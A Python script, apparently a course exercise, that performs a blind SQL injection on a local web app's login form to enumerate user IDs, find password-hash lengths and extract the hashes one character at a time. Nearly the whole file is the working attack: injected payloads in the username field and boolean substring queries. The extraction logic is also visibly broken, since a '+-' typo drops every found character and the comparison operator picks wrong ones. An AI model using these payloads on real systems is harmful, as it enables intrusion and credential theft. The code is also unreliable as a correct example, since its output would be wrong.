# This script launches a blind SQL injection attack against a vulnerable user-defined web app to determine what user(s) are valid,
# find the length of their passwords as well as extract their password hashes from the SQL DB
# Logic is adapted from the TCM Python 101 for Hackers course: https://academy.tcm-sec.com/p/python-101-for-hackers 

import requests

# Define parameters of attack
target = "http://127.0.0.1:5000" # Host IP and port
needle = "Welcome back" # Part of the message received from web app upon successful login
charset = "0123456789abcdef" # Used as data extracted is in hex format
totalQueries = 0 # Count of queries made during the attack

# Function accepts an SQL injection payload and sends it to the vulnerable web server
# attempting to bypass the authentication page
def injectedQuery(payload):
	global totalQueries

	# Create and send the POST request including the SQL injection payload
	req = requests.post(target, data = {"username": "admin' and {}--".format(payload), "password": "password"})

	totalQueries += 1 # Increment the total count of queries made

	# Check if the needle is included in the server response. If True, the request was valid; if False the request was invalid
	return needle.encode() not in req.content

# Function accepts an offset, userID, character and operator to create an SQL query that will result in a True/False response
# Query created resembles: substring(passwordHash, index, 1) > 'char'#
def booleanQuery(offset, userID, character, operator=">"):
	payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, userID, operator, character)
	return injectedQuery(payload)

# Function accepts a userID to create an SQL query to determine if a userID is valid
# Purpose: Ask the server for a userID value, incrementing until a True result is returned,
# verifying the userID guessed is valid
def invalidUser(userID):
	payload = "(select id from user where id = {}) >= 0".format(userID)
	return injectedQuery(payload)

# Function accepts a userID to create an SQL query to determine the length of a user's password hash
# Purpose: Ask the server if the password hash has length 0, incrementing by 1 until a False result is returned,
# verifying the length of the user's password hash is the value guessed
def passwordLength(userID):
	length = 0
	while True:
		payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(userID, length)
		if not injectedQuery(payload):
			return length

		length += 1

# Function accepts a charset, userID and password length to create an SQL query to determine if a character guessed matches
# the character at index I of the user's password hash
# Purpose: Building a user's password hash one character at a time
def extractPasswordHash(charset, userID, passwordLength):
	found = ""
	# Iterate over the length of the password hash, guessing each letter of our given charset
	# to determine which character is found at that index of the valid password hash
	for i in range(0, passwordLength):
		for char in range(len(charset)):

			# Create an SQL query checking if the substring (character) exists at the given index of
			# a user's password hash
			# Query created resembles: substring(passwordHash, index, 1) > 'char'#
			if booleanQuery(i, userID, charset[char]):

				# If the query returns True, we have found the character at index I
				# Add the found character to a string and go to the next loop iteration
				found +- charset[char]
				break
	return found

# Function prints the value of the global totalQueries variable
def totalQueriesMade():
	global totalQueries
	print("\t[*] {} total SQL queries made.".format(totalQueries))

# Infinite loop for user to interact with script
while True:
	try:
		userID = input("Enter a user ID to extract that user's password hash: ")

		# Determine if the userID entered is valid
		# If valid, find the user's password hash length calling the passwordLength function then
		# find the user's password hash calling the extractPasswordHash function
		if not invalidUser(userID):
			userPasswordLength = passwordLength(userID)
			print("User {}'s password has a hash length of {}".format(userID, userPasswordLength))
			print("User {}'s password hash is: {}".format(userID, extractPasswordHash(charset, int(userID), userPasswordLength)))
			totalQueriesMade()
		else:
			print("User {} does not exist. Please try again.".format(userID))
	# Exit the infinite loop on a keyboard interrupt
	except KeyboardInterrupt:
		break